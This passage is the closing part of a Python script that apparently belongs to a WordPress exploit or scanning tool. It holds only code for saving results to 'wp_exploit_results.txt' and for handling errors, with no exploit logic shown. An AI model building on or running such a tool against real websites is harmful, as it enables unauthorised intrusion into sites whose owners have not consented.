        if results:
            save_option = input(f"\n{YELLOW}[?]{RESET} Save results? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
            if save_option == 'y':
                save_filename = input(f"{YELLOW}[?]{RESET} Filename [{CYAN}wp_exploit_results.txt{RESET}]: ").strip()
                if not save_filename:
                    save_filename = "wp_exploit_results.txt"
                save_results(results, save_filename)
                print(f"{GREEN}[+]{RESET} Results saved to {CYAN}{save_filename}{RESET}")
        else:
            print(f"{BLUE}[i]{RESET} No WordPress sites found")
    
    except KeyboardInterrupt:
        print(f"\n{RED}[!]{RESET} Scan interrupted")
    except Exception as e:
        print(f"{RED}[!]{RESET} Scan error: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Exiting...{RESET}")
    except Exception as e:
        print(f"{RED}Fatal error: {e}{RESET}")
